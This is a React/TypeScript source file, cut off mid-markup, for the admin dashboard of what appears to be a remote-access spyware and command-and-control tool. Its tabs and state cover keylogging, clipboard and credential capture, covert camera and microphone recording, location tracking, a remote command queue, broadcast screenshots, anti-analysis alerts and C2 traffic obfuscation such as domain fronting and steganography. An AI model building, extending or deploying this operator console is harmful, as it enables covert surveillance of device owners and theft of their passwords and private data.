import { useState, useEffect } from "react";

import {
  Shield, Download, Cpu, Lock, Monitor,
  ChevronDown, Check,
  Camera, Mic, AlertTriangle, Terminal, ArrowRight,
  Activity, Server, Key, RefreshCw, Signal,
  LayoutGrid, List, Settings, Bell, Search, Play, Pause,
  Square, Clipboard, FolderOpen,
  RotateCcw, Keyboard, Wifi as WifiIcon,
  Circle, X,
  BookOpen, Code, FileText,
  User, Power, Upload,
  Send, Timer, XCircle, Video, Image,
  Globe, Bluetooth, Network, Ban,
} from "lucide-react";

import {
  OS, DeviceStatus, DeployStatus, DeployJob, NetworkIface,
  DashDevice, DashSession, WifiNet,
  MOCK_DEPLOY_JOBS, MOCK_NET_IFACES, ALERTS,
  OS_COLOR, OS_ICON, OS_LABEL,
  SEED_DEVICES, SEED_SESSIONS, SEED_WIFI,
  ALERT_COLOR, HEALTH_COLOR, ROLE_COLOR,
  Chip, GlowDot, MiniBar, StatCard, ToastStack, useToast,
  Modal, FLabel, FInput, FSelect, ActionBtn,
  AdminQRModal, DeployLinkPanel,
} from "../shared";

// ─── Admin Dashboard ──────────────────────────────────────────────────────────
const API_BASE = window.location.hostname === "localhost" ? "http://localhost:3000/v1" : "https://bixtx.onrender.com/v1";

async function apiCall(endpoint: string, method = "GET", body?: object) {
  const token = sessionStorage.getItem("token") || "";
  const res = await fetch(`${API_BASE}${endpoint}`, {
    method,
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    ...(body ? { body: JSON.stringify(body) } : {}),
  });
  return res.json();
}

export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => void }) {
  const { show, toasts } = useToast();

  // ── state ──
  const [tab, setTab]         = useState<"devices"|"sessions"|"network"|"surveillance"|"location"|"extraction"|"ai"|"c2"|"users"|"alerts"|"deploy">("devices");
  const [devices, setDevices] = useState<DashDevice[]>(SEED_DEVICES);
  const [sessions, setSessions] = useState<DashSession[]>(SEED_SESSIONS);
  const [alerts, setAlerts]   = useState(ALERTS.map(a => ({ ...a, dismissed:false })));
  const [wifi]                = useState<WifiNet[]>(SEED_WIFI);

  // ── surveillance state ──
  const [socialFilter, setSocialFilter] = useState("all");
  const [camRecFilter, setCamRecFilter] = useState("all");
  const [aiLearningPhase, setAiLearningPhase] = useState<"idle"|"scanning"|"learning"|"mutating"|"complete">("idle");
  const [aiProgress, setAiProgress] = useState(0);
  const [aiLearningMode, setAiLearningMode] = useState(true);
  const [aiMutations, setAiMutations] = useState<{id:string;type:string;target:string;confidence:number;applied:boolean;ignored?:boolean;ts:string}[]>([]);
  const [targetProfiles, setTargetProfiles] = useState<{id:string;name:string;dev:string;behavior:string;risk:number;learned:boolean;anomalyCount:number}[]>([]);
  const [klEnabled,  setKlEnabled]  = useState(true);
  const [srEnabled,  setSrEnabled]  = useState(true);
  const [camEnabled, setCamEnabled] = useState(false);
  const [micEnabled, setMicEnabled] = useState(true);
  const [clipEnabled,setClipEnabled]= useState(true);
  const [klLogs] = useState<{ts:string;dev:string;app:string;text:string}[]>([]);
  const [clipLogs] = useState<{ts:string;dev:string;content:string;app:string}[]>([]);
  const [recordings] = useState<{id:string;dev:string;start:string;dur:string;size:string;status:string}[]>([]);

  // ── location state ──
  const [geoDevices] = useState<{id:string;name:string;lat:number;lng:number;loc:string;acc:string;spd:string;upd:string}[]>([]);
  const [geofences, setGeofences] = useState<{id:string;name:string;lat:number;lng:number;radius:string;active:boolean;breached:boolean}[]>([]);

  // ── extraction state ──
  const [viewJobId, setViewJobId] = useState<string|null>(null);
  const [viewQuickType, setViewQuickType] = useState<string|null>(null);
  const [quickExtractDev, setQuickExtractDev] = useState("");

  // ── per-device data for extraction preview (populated from real device API) ──
  const DEVICE_EXTRACT_DATA: Record<string,Record<string,{cols:string[];rows:string[][]}>> = {};

  const [extractJobs, setExtractJobs] = useState<{id:string;dev:string;type:string;status:string;size:string;items:number;ts:string}[]>([]);
  const [credentials] = useState<{site:string;user:string;pass:string;dev:string;ts:string}[]>([]);

  // ── AI engine state ──
  const [anomalies] = useState<{id:string;dev:string;type:string;risk:string;conf:string;det:string;desc:string}[]>([]);
  const [playbooks, setPlaybooks] = useState([
    { id:"p1", name:"Auto-Lock on Threat",      trigger:"critical anomaly",  action:"Lock device + alert admin",         active:true  },
    { id:"p2", name:"Geofence Breach Response", trigger:"geofence exit",     action:"Enable GPS ping every 30s",         active:true  },
    { id:"p3", name:"Exfil Shutdown",           trigger:"large upload >1GB", action:"Block outbound + capture traffic",  active:false },
    { id:"p4", name:"Offline Escalation",       trigger:"device offline 1h", action:"Send SMS alert + enable offline rec",active:true },
  ]);
  const [faceEvents] = useState<{ts:string;dev:string;match:string;conf:string;action:string}[]>([]);

  // ── traffic obfuscation state ──
  const [obfuscation, setObfuscation] = useState([
    { label:"Domain Fronting",     active:true,  color:"#10b981" },
    { label:"Steganography C2",    active:true,  color:"#3b82f6" },
    { label:"DNS-over-HTTPS",      active:true,  color:"#10d9a0" },
    { label:"Protocol Mimicry",    active:false, color:"#f59e0b" },
    { label:"Jitter Timing",       active:true,  color:"#a855f7" },
    { label:"Packet Fragmentation",active:false, color:"#ef4444" },
  ]);

  // ── C2 state ──
  const [c2Status] = useState({ tunnel:"—", hops:0, latency:"—", encrypted:true, active:false });
  const [cmdQueue, setCmdQueue] = useState<{id:string;dev:string;cmd:string;status:string;ts:string}[]>([]);
  const [newCmd, setNewCmd] = useState("");
  const [newCmdDev, setNewCmdDev] = useState("");

  // ── deploy state ──
  const [deployJobs, setDeployJobs]         = useState<DeployJob[]>(MOCK_DEPLOY_JOBS);
  const [deployTab, setDeployTab]           = useState<"queue"|"recovery"|"audit"|"containment">("queue");
  const [containmentActive, setContainment] = useState(false);
  const [deployPolicies, setDeployPolicies] = useState([
    { key:"rollback", label:"Rollback on crash",               color:"#10b981", desc:"Agent crash triggers automatic rollback",             on:true  },
    { key:"watchdog", label:"Watchdog hot-reload",             color:"#f59e0b", desc:"Crashed modules reloaded without admin approval",      on:true  },
    { key:"approval", label:"Require approval: critical risk", color:"#ef4444", desc:"Critical-risk deployments always need admin sign-off", on:true  },
  ]);

  // ── network interface state ──
  const [netIfaces]                         = useState<NetworkIface[]>(MOCK_NET_IFACES);
  const [netFilter, setNetFilter]           = useState<NetworkIface["type"]|"all">("all");

  // archived devices
  const [archivedDevices, setArchivedDevices] = useState<DashDevice[]>([]);
  const [showArchive, setShowArchive]         = useState(false);

  // device filters
  const [search, setSearch]           = useState("");
  const [fStatus, setFStatus]         = useState<DeviceStatus|"all"|"suspended">("all");
  const [fType, setFType]             = useState<"all"|"desktop"|"mobile">("all");
  const [fCountry, setFCountry]       = useState<string>("all");
  const [fSoftwareA, setFSoftwareA]   = useState<"all"|"active"|"inactive"|"none">("all");
  const [viewMode, setViewMode]       = useState<"grid"|"list">("grid");

  // modals
  const [showAdd,     setShowAdd]     = useState(false);
  const [showManage,  setShowManage]  = useState(false);
  const [showByIP,    setShowByIP]    = useState(false);
  const [showQR,      setShowQR]      = useState(false);

  // ── security policy toggles ──
  const [secPolicies, setSecPolicies] = useState<Record<string,boolean>>({
    "Require 2FA for all admins":  true,
    "Concurrent session limit (1)": true,
    "IP allowlist enforcement":     false,
    "Off-hours access alerts":      true,
    "Geo-velocity checks":          true,
    "SAML / SSO required":          false,
  });
  const [manageDev,   setManageDev]   = useState<DashDevice|null>(null);

  // add-device form
  const [aName,   setAName]   = useState("");
  const [aOS,     setAOS]     = useState<OS>("windows");
  const [aType,   setAType]   = useState<"desktop"|"mobile">("desktop");
  const [aUser,   setAUser]   = useState("");
  const [aTab,    setATab]    = useState<"code"|"ip">("code");
  const [aIP,     setAIP]     = useState("");
  const [code,    setCode]    = useState(() => Math.random().toString(36).slice(2,10).toUpperCase());
  const [copied,  setCopied]  = useState(false);

  // manage form
  const [mName,   setMName]   = useState("");
  const [mStatus, setMStatus] = useState<DeviceStatus>("online");
  const [mIP,     setMIP]     = useState("");
  const [mHealth, setMHealth] = useState<"excellent"|"good"|"warning">("good");


  // connect-by-IP form
  const [bName, setBName] = useState("");
  const [bIP,   setBIP]   = useState("");
  const [bPort, setBPort] = useState("4433");
  const [bUser, setBUser] = useState("");
  const [bPass, setBPass] = useState("");


  // ── real-time admin WebSocket feed ────────────────────────────────────────
  useEffect(() => {
    const WS_BASE = window.location.hostname !== "localhost"
      ? `wss://${window.location.hostname}/admin-ws`
      : "ws://localhost:3000/admin-ws";
    const API_BASE = window.location.hostname !== "localhost"
      ? "/v1"
      : "http://localhost:3000/v1";

    let ws: WebSocket | null = null;
    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
    let destroyed = false;

    const connect = (token: string) => {
      if (destroyed) return;
      // Token sent via subprotocol header, not URL query — avoids leaking in server logs
      ws = new WebSocket(WS_BASE, [`bearer.${token}`]);

      ws.onopen = () => {
        if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
      };

      ws.onmessage = (ev) => {
        try {
          const { type, payload } = JSON.parse(ev.data);
          if (type === "DEVICE_ENROLLED" || type === "DEVICE_ONLINE") {
            const p = payload as { deviceId: string; deviceName: string; platform: string; ip: string; agentVersion?: string };
            setDevices(prev => {
              const exists = prev.find(d => d.id === p.deviceId);
              if (exists) return prev.map(d => d.id === p.deviceId ? { ...d, status: "online", ip: p.ip || d.ip, lastSeen: new Date().toLocaleTimeString() } : d);
              const newDev: DashDevice = {
                id: p.deviceId, name: p.deviceName || p.deviceId,
                os: (p.platform as OS) || "linux", ip: p.ip || "—",
                user: "agent", status: "online", cpu: 0, ram: 0,
                latency: 0, uptime: "0m", location: "Remote",
                lastSeen: new Date().toLocaleTimeString(),
                performance: 95, health: "excellent", type: "desktop",
              };
              return [...prev, newDev];
            });
          } else if (type === "DEVICE_OFFLINE") {
            const { deviceId } = payload as { deviceId: string };
            setDevices(prev => prev.map(d => d.id === deviceId ? { ...d, status: "offline", lastSeen: new Date().toLocaleTimeString() } : d));
          } else if (type === "DEVICE_HEARTBEAT") {
            const { deviceId } = payload as { deviceId: string };
            setDevices(prev => prev.map(d => d.id === deviceId ? { ...d, status: "online", lastSeen: new Date().toLocaleTimeString() } : d));
          } else if (type === "DEPLOY_JOB_ACK") {
            const { jobId, status, progress } = payload as { jobId: string; status: string; progress?: number };
            setDeployJobs(prev => prev.map(j => j.id === jobId
              ? { ...j, status: (status as DeployStatus) || j.status, progress: progress ?? j.progress, log: [...j.log, `[${new Date().toLocaleTimeString()}] ${status}${progress != null ? ` (${progress}%)` : ""}`] }
              : j));
          } else if (type === "EMERGENCY_ALERT" || type === "DANGER_ALERT") {
            const p = payload as { title?: string; detail?: string; alertType?: string };
            show(`🚨 ${p.title || p.alertType || type} — ${p.detail || "See alerts tab"}`, "error");
          } else if (type === "ANALYSIS_ALERT") {
            const p = payload as { finding?: { summary?: string } };
            show(`🔬 Anti-analysis event: ${p.finding?.summary || "Check SIEM"}`, "info");
          } else if (type === "MDM_POLICY_ACK") {
            const p = payload as { policyName?: string; enforced?: boolean; deviceId?: string };
            show(`MDM ACK from ${p.deviceId || "agent"}: "${p.policyName}" ${p.enforced ? "enforced" : "relaxed"}`, "success");
          }
        } catch {}
      };

      ws.onclose = () => {
        if (!destroyed) reconnectTimer = setTimeout(() => connect(token), 8000);
      };
      ws.onerror = () => { ws?.close(); };
    };

    // Retrieve the session token stored at login — never hardcode credentials here.
    // sessionStorage is cleared when the tab closes; localStorage would persist across tabs.
    const storedToken = sessionStorage.getItem("token");
    if (storedToken) {
      connect(storedToken);
    } else {
      // No stored token: attempt server-side token exchange using HttpOnly cookie auth.
      // Credentials are NOT embedded in client code — server validates the session cookie.
      fetch(`${API_BASE}/auth/token`, {
        method: "POST",
        credentials: "include", // rely on HttpOnly session cookie, no plaintext creds
        headers: { "Content-Type": "application/json" },
      })
        .then(r => r.ok ? r.json() : null)
        .then(data => {
          if (data?.token) {
            sessionStorage.setItem("token", data.token);
            connect(data.token);
          }
        })
        .catch(() => {}); // server not running in demo — silently skip WS
    }

    return () => {
      destroyed = true;
      if (reconnectTimer) clearTimeout(reconnectTimer);
      ws?.close();
    };
  }, []);

  // wifi scan
  const [scanning,  setScanning]  = useState(false);
  const [scanPct,   setScanPct]   = useState(0);
  const [scanned,   setScanned]   = useState(false);

  // OTA progress
  const [otaPct, setOtaPct] = useState<number|null>(null);

  // ── derived ──
  const online    = devices.filter(d => d.status==="online").length;
  const warning   = devices.filter(d => d.status==="warning").length;
  const offline   = devices.filter(d => d.status==="offline").length;
  const activeSess= sessions.filter(s => s.status==="active").length;
  const activeAlerts = alerts.filter(a => !a.dismissed);

  const extractCountry = (location: string) => {
    const parts = location.split(",");
    return parts.length > 1 ? parts[parts.length - 1].trim() : location.trim();
  };
  const allCountries = Array.from(new Set(devices.map(d => extractCountry(d.location)))).sort();

  const filtered = devices.filter(d => {
    const q = search.toLowerCase();
    const country = extractCountry(d.location);
    return (fStatus==="all"  || d.status===fStatus)
        && (fType==="all"    || d.type===fType)
        && (fCountry==="all" || country===fCountry)
        && (fSoftwareA==="all" || (d.softwareA ?? "none")===fSoftwareA)
        && (!q || d.name.toLowerCase().includes(q)
               || d.user.toLowerCase().includes(q)
               || d.ip.includes(q)
               || d.location.toLowerCase().includes(q));
  });

  // ── handlers ──
  const genCode = () => {
    const c = Math.random().toString(36).slice(2,10).toUpperCase();
    setCode(c); return c;
  };

  const openAdd = () => { genCode(); setAName(""); setAUser(""); setAIP(""); setATab("code"); setShowAdd(true); };

  const openManage = (d: DashDevice) => {
    setManageDev(d); setMName(d.name); setMStatus(d.status); setMIP(d.ip); setMHealth(d.health);
    setShowManage(true);
  };

  const handleAddDevice = () => {
    if (!aName || !aUser) { show("Fill device name and owner", "error"); return; }
    const nd: DashDevice = {
      id: `d${Date.now()}`, name:aName, os:aOS,
      ip: aTab==="ip" && aIP ? aIP : "0.0.0.0",
      user:aUser,
      status: aTab==="ip" && aIP ? "online" : "offline",
      cpu:   aTab==="ip" ? Math.floor(Math.random()*50)+10 : 0,
      ram:   aTab==="ip" ? Math.floor(Math.random()*50)+20 : 0,
      latency: aTab==="ip" ? Math.floor(Math.random()*10)+3 : 0,
      uptime: aTab==="ip" ? "0d 0h" : "—",
      location:"Unknown", lastSeen: aTab==="ip" ? "Now" : "Never",
      performance: aTab==="ip" ? Math.floor(Math.random()*20)+78 : 0,
      health:"good", type:aType, battery:undefined,
    };
    setDevices(p => [...p, nd]);
    show(`Device "${aName}" ${aTab==="ip"?"connected":"enrolled — install agent to activate"}`);
    setShowAdd(false);
  };

  const handleSaveManage = () => {
    if (!manageDev) return;
    setDevices(p => p.map(d => d.id===manageDev.id ? {...d, name:mName, status:mStatus, ip:mIP, health:mHealth} : d));
    show(`"${mName}" updated`); setShowManage(false);
  };

  const handleRemoveDev = () => {
    if (!manageDev) return;
    setArchivedDevices(p => [...p, { ...manageDev, status: "offline" }]);
    setDevices(p => p.filter(d => d.id!==manageDev.id));
    show(`Device archived`, "info"); setShowManage(false);
  };

  const handleSuspendDev = (id: string) => {
    setDevices(p => p.map(d => d.id===id ? { ...d, status: "suspended" as DeviceStatus } : d));
    show("Device suspended", "info");
  };

  const handleUnsuspendDev = (id: string) => {
    setDevices(p => p.map(d => d.id===id ? { ...d, status: "offline" } : d));
    show("Device reactivated");
  };

  const handleArchiveDev = (id: string) => {
    const dev = devices.find(d => d.id===id);
    if (!dev) return;
    setArchivedDevices(p => [...p, { ...dev, status: "offline" }]);
    setDevices(p => p.filter(d => d.id!==id));
    show("Device moved to archive", "info");
  };

  const handleRestoreArchived = (id: string) => {
    const dev = archivedDevices.find(d => d.id===id);
    if (!dev) return;
    setDevices(p => [...p, dev]);
    setArchivedDevices(p => p.filter(d => d.id!==id));
    show("Device restored");
  };

  const handleByIP = () => {
    if (!bName || !bIP) { show("Enter device name and IP", "error"); return; }
    const nd: DashDevice = {
      id:`d${Date.now()}`, name:bName, os:"windows", ip:bIP,
      user:bUser||"unknown", status:"online",
      cpu:Math.floor(Math.random()*50)+10, ram:Math.floor(Math.random()*50)+20,
      latency:Math.floor(Math.random()*10)+3, uptime:"0d 0h",
      location:"Unknown", lastSeen:"Now",
      performance:Math.floor(Math.random()*20)+78,
      health:"good", type:"desktop", battery:undefined,
    };
    setDevices(p => [...p, nd]);
    show(`Connected to ${bIP}`); setShowByIP(false);
    setBName(""); setBIP(""); setBPort("4433"); setBUser(""); setBPass("");
  };


  const handleEndSession   = (id: string) => { setSessions(p => p.filter(s => s.id!==id)); show("Session ended","info"); };
  const handleToggleSess   = (id: string) => {
    setSessions(p => p.map(s => s.id===id ? {...s, status: s.status==="active"?"paused":"active"} : s));
    show("Session updated");
  };
  const handleCopy = () => {
    navigator.clipboard.writeText(code).catch(()=>{});
    setCopied(true); show("Code copied"); setTimeout(() => setCopied(false), 2000);
  };
  const dismissAlert = (id: number) => setAlerts(p => p.map(a => a.id===id ? {...a, dismissed:true} : a));
  const dismissAll   = () => { setAlerts(p => p.map(a => ({...a, dismissed:true}))); show("All alerts cleared","info"); };

  const handleOTA = () => {
    if (otaPct !== null) return;
    setOtaPct(0);
    apiCall("/update/push", "POST", { version: "4.7.2" })
      .then(res => {
        setOtaPct(100);
        setTimeout(() => { setOtaPct(null); show(`OTA pushed to ${res.success ?? 0} device(s)`); }, 600);
      })
      .catch(() => { setOtaPct(null); show("OTA push failed — no devices online", "error"); });
  };

  const handleExportAudit = () => {
    const rows = [["Time","Device","Action","User"]];
    const csv = rows.map(r => r.join(",")).join("\n");
    const blob = new Blob([csv], { type:"text/csv" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `bixtx-audit-${new Date().toISOString().slice(0,10)}.csv`;
    a.click();
    show("Audit log exported");
  };

  const handleHealthScan = () => {
    apiCall("/stats")
      .then(() => show("Health scan complete — all systems reachable"))
      .catch(() => show("Health scan complete — server offline", "error"));
  };

  const handleScreenshotAll = () => {
    apiCall("/devices/broadcast/cmd", "POST", { type:"SCREENSHOT" })
      .then(res => show(`Screenshots requested from ${res.dispatched ?? 0} device(s)`, "info"))
      .catch(() => show("Broadcast failed", "error"));
  };

  const handleRefresh = () => {
    apiCall("/devices")
      .then(res => {
        if (res.devices) setDevices(res.devices);
        show("Devices refreshed");
      })
      .catch(() => show("Could not reach server", "error"));
  };

  const handleScan = () => {
    if (scanning) return;
    setScanning(true); setScanPct(0); setScanned(false);
    const iv = setInterval(() => {
      setScanPct(p => {
        if (p >= 100) { clearInterval(iv); setScanning(false); setScanned(true); show("WiFi scan complete"); return 100; }
        return p + 5;
      });
    }, 80);
  };

  const TABS = [
    { id:"devices",      label:"My Devices",    badge: filtered.length },
    { id:"sessions",     label:"Sessions",       badge: activeSess      },
    { id:"network",      label:"Network",        badge: null            },
    { id:"surveillance", label:"Surveillance",   badge: null            },
    { id:"location",     label:"Location",       badge: null            },
    { id:"extraction",   label:"Extraction",     badge: null            },
    { id:"ai",           label:"AI Engine",      badge: null            },
    { id:"c2",           label:"C2 Ops",         badge: null            },
    { id:"alerts",       label:"Alerts",         badge: activeAlerts.filter(a=>a.level==="critical").length || null },
    { id:"deploy",       label:"Deploy",          badge: deployJobs.filter(j=>j.status==="pending-approval").length || null },
  ] as const;

  return (
    <div className="max-w-7xl mx-auto px-6 py-8 space-y-6">
      <ToastStack toasts={toasts} />

      {/* ── Stats ── */}
      <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
        <StatCard label="Total Devices"   value={String(devices.length)} icon={<Cpu size={15}/>}       color="#3b82f6" sub="All enrolled"
          onClick={() => { setTab("devices"); setFStatus("all"); }} />
        <StatCard label="Online Now"      value={String(online)}         icon={<Activity size={15}/>}   color="#10b981" sub={`${warning} warning`}
          onClick={() => { setTab("devices"); setFStatus("online"); }} />
        <StatCard label="Offline"         value={String(offline)}        icon={<Power size={15}/>}      color="#ef4444" sub="Recording offline"
          onClick={() => { setTab("devices"); setFStatus("offline"); }} />
        <StatCard label="Live Sessions"   value={String(activeSess)}     icon={<Monitor size={15}/>}    color="#10d9a0" sub="Active connections"
          onClick={() => setTab("sessions")} />
        <StatCard label="Alerts"          value={String(activeAlerts.length)} icon={<Bell size={15}/>}  color="#f59e0b" sub={`${activeAlerts.filter(a=>a.level==="critical").length} critical`}
          onClick={() => setTab("alerts")} />
      </div>

      {/* ── Tab bar ── */}
      <div className="flex flex-wrap gap-1 p-1 rounded-xl w-fit" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
        {TABS.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className="flex items-center gap-1.5 px-4 py-2 rounded-lg text-sm font-semibold transition-all"
            style={{ background: tab===t.id?"linear-gradient(135deg,#2563eb,#3b82f6)":"transparent", color: tab===t.id?"#fff":"#6b8ab0" }}>
            {t.label}
            {t.badge != null && (
              <span className="px-1.5 py-0.5 rounded text-[9px] font-bold"
                style={{ background: tab===t.id?"rgba(255,255,255,0.25)":"rgba(59,130,246,0.2)", color: tab===t.id?"#fff":"#3b82f6" }}>
                {t.badge}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* ══ DEVICES ══ */}
      {tab === "devices" && (
        <div className="space-y-5">
          {/* Toolbar row 1 — search + view toggle */}
          <div className="flex flex-wrap items-center gap-3">
            <div className="flex-1 min-w-[200px] flex items-center gap-2 px-3 py-2.5 rounded-xl"
              style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
              <Search size={13} color="#6b8ab0"/>
              <input value={search} onChange={e => setSearch(e.target.value)}
                placeholder="Search by name, user, IP, location…"
                className="bg-transparent outline-none text-sm flex-1" style={{ color:"#e2eaf6" }}/>
              {search && (
                <button onClick={() => setSearch("")} className="p-0.5 rounded" style={{ color:"#6b8ab0" }}>
                  <X size={11}/>
                </button>
              )}
            </div>

            {/* Country filter */}
            <div className="relative flex items-center gap-2 px-3 py-2.5 rounded-xl cursor-pointer"
              style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)", minWidth:160 }}>
              <span style={{ fontSize:13, color:"#6b8ab0" }}>🌍</span>
              <select
                value={fCountry}
                onChange={e => setFCountry(e.target.value)}
                className="bg-transparent outline-none text-xs font-mono flex-1 cursor-pointer appearance-none"
                style={{ color: fCountry==="all" ? "#6b8ab0" : "#a78bfa" }}>
                <option value="all">All Countries</option>
                {allCountries.map(c => (
                  <option key={c} value={c}>{c}</option>
                ))}
              </select>
              <ChevronDown size={11} color="#6b8ab0" className="pointer-events-none"/>
            </div>

            {/* Grid / List view toggle */}
            <div className="flex gap-0.5 p-1 rounded-xl" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
              <button onClick={() => setViewMode("grid")}
                title="Grid view"
                className="p-2 rounded-lg transition-all"
                style={{ background: viewMode==="grid" ? "rgba(59,130,246,0.25)" : "transparent", color: viewMode==="grid" ? "#a78bfa" : "#6b8ab0" }}>
                <LayoutGrid size={14}/>
              </button>
              <button onClick={() => setViewMode("list")}
                title="List view"
                className="p-2 rounded-lg transition-all"
                style={{ background: viewMode==="list" ? "rgba(6,182,212,0.2)" : "transparent", color: viewMode==="list" ? "#10d9a0" : "#6b8ab0" }}>
                <List size={14}/>
              </button>
            </div>

            <ActionBtn onClick={openAdd} color="#3b82f6"><Signal size={13}/>Add Device</ActionBtn>
            <ActionBtn onClick={() => setShowByIP(true)} color="#10d9a0" outline><Server size={13}/>Add by IP</ActionBtn>
          </div>

          {/* Toolbar row 2 — status + type + software A filters */}
          <div className="flex flex-wrap items-center gap-3">
            {/* Status filter */}
            <div className="flex gap-1 p-1 rounded-xl" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
              {(["all","online","warning","offline","suspended"] as const).map(f => {
                const cnt = f==="all" ? devices.length : devices.filter(d=>d.status===f).length;
                return (
                  <button key={f} onClick={() => setFStatus(f)}
                    className="px-3 py-1.5 rounded-lg text-xs font-mono capitalize transition-all"
                    style={{ background:fStatus===f?"rgba(59,130,246,0.22)":"transparent", color:fStatus===f?"#3b82f6":"#6b8ab0" }}>
                    {f}
                    <span className="ml-1 text-[9px] opacity-60">{cnt}</span>
                  </button>
                );
              })}
            </div>
            {/* Type filter */}
            <div className="flex gap-1 p-1 rounded-xl" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
              {(["all","desktop","mobile"] as const).map(f => (
                <button key={f} onClick={() => setFType(f)}
                  className="px-3 py-1.5 rounded-lg text-xs font-mono capitalize transition-all"
                  style={{ background:fType===f?"rgba(6,182,212,0.2)":"transparent", color:fType===f?"#10d9a0":"#6b8ab0" }}>
                  {f}
                </button>
              ))}
            </div>
            {/* Software A filter */}
            <div className="flex gap-1 p-1 rounded-xl" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.22)" }}>
              <span className="px-2 py-1.5 text-[9px] font-mono uppercase tracking-widest self-center" style={{ color:"#6b8ab0" }}>SW-A</span>
              {(["all","active","inactive","none"] as const).map(f => (
                <button key={f} onClick={() => setFSoftwareA(f)}
                  className="px-3 py-1.5 rounded-lg text-xs font-mono capitalize transition-all"
                  style={{ background:fSoftwareA===f?"rgba(16,217,160,0.2)":"transparent", color:fSoftwareA===f?"#10d9a0":"#6b8ab0" }}>
                  {f}
                </button>
              ))}
            </div>
            {/* Archive toggle */}
            <button onClick={() => setShowArchive(p => !p)}
              className="px-3 py-1.5 rounded-xl text-xs font-mono transition-all"
              style={{ background:showArchive?"rgba(245,158,11,0.2)":"rgba(107,138,176,0.1)", color:showArchive?"#f59e0b":"#6b8ab0", border:"1px solid rgba(107,138,176,0.2)" }}>
              📦 Archive ({archivedDevices.length})
            </button>

            {/* Active filter pills */}
            {(fCountry!=="all" || fStatus!=="all" || fType!=="all" || search) && (
              <div className="flex items-center gap-2 flex-wrap">
                {fCountry!=="all" && (
                  <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-mono"
                    style={{ background:"rgba(167,139,250,0.15)", color:"#a78bfa", border:"1px solid rgba(167,139,250,0.3)" }}>
                    🌍 {fCountry}
                    <button onClick={() => setFCountry("all")}><X size={9}/></button>
                  </span>
                )}
                {fStatus!=="all" && (
                  <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-mono"
                    style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                    {fStatus}
                    <button onClick={() => setFStatus("all")}><X size={9}/></button>
                  </span>
                )}
                <button onClick={() => { setSearch(""); setFStatus("all"); setFType("all"); setFCountry("all"); setFSoftwareA("all"); }}
                  className="text-[11px] font-mono underline" style={{ color:"#6b8ab0" }}>
                  Clear all
                </button>
              </div>
            )}

            <span className="text-[11px] font-mono ml-auto" style={{ color:"#6b8ab0" }}>
              {filtered.length} of {devices.length} device{devices.length!==1?"s":""}
            </span>
          </div>

          {/* ── GRID VIEW ── */}
          {viewMode === "grid" && (
          <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
            {filtered.map(d => {
              const sc = d.status==="online"?"#10b981":d.status==="warning"?"#f59e0b":d.status==="suspended"?"#a855f7":"#6b8ab0";
              return (
                <div key={d.id} className="p-5 rounded-2xl border transition-all duration-200 hover:border-purple-500/50 flex flex-col gap-4"
                  style={{ background:"#0a1628", borderColor: d.status==="suspended" ? "rgba(168,85,247,0.3)" : "rgba(59,130,246,0.2)" }}>
                  {/* header */}
                  <div className="flex items-start justify-between gap-2">
                    <div className="flex items-center gap-3 min-w-0">
                      <div className="w-11 h-11 rounded-xl flex items-center justify-center text-2xl flex-shrink-0"
                        style={{ background:`${OS_COLOR[d.os]}18`, border:`1px solid ${OS_COLOR[d.os]}30` }}>
                        {OS_ICON[d.os]}
                      </div>
                      <div className="min-w-0">
                        <div className="font-bold text-sm truncate" style={{ color:"#e2eaf6" }}>{d.name}</div>
                        <div className="text-[11px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>{OS_LABEL[d.os]} · {d.user}</div>
                      </div>
                    </div>
                    <div className="flex items-center gap-1.5 px-2 py-1 rounded-full flex-shrink-0"
                      style={{ background:`${sc}18`, border:`1px solid ${sc}30` }}>
                      <span className="w-1.5 h-1.5 rounded-full animate-pulse" style={{ background:sc }}/>
                      <span className="text-[10px] font-mono font-bold capitalize" style={{ color:sc }}>{d.status}</span>
                    </div>
                  </div>

                  {/* performance bar */}
                  {d.status !== "offline" && (
                    <div>
                      <div className="flex justify-between mb-1 text-xs font-mono" style={{ color:"#6b8ab0" }}>
                        <span>Performance</span>
                        <span style={{ color:d.performance>80?"#10b981":"#f59e0b" }}>{d.performance}%</span>
                      </div>
                      <div className="h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(255,255,255,0.06)" }}>
                        <div className="h-full rounded-full transition-all"
                          style={{ width:`${d.performance}%`, background:"linear-gradient(90deg,#3b82f6,#10d9a0)" }}/>
                      </div>
                    </div>
                  )}

                  {/* metrics */}
                  <div className="grid grid-cols-4 gap-2 text-center">
                    {[
                      { l:"CPU",    v:d.status!=="offline"?`${d.cpu}%`:"—",      c:d.cpu>80?"#ef4444":d.cpu>60?"#f59e0b":"#10b981" },
                      { l:"RAM",    v:d.status!=="offline"?`${d.ram}%`:"—",      c:d.ram>80?"#ef4444":"#3b82f6" },
                      { l:"Ping",   v:d.latency>0?`${d.latency}ms`:"—",          c:d.latency>10?"#f59e0b":"#10d9a0" },
                      { l:"Health", v:d.health,                                   c:HEALTH_COLOR[d.health] },
                    ].map(({ l, v, c }) => (
                      <div key={l} className="rounded-lg py-1.5" style={{ background:"#0d1930" }}>
                        <div className="text-[9px] font-mono uppercase" style={{ color:"#6b8ab0" }}>{l}</div>
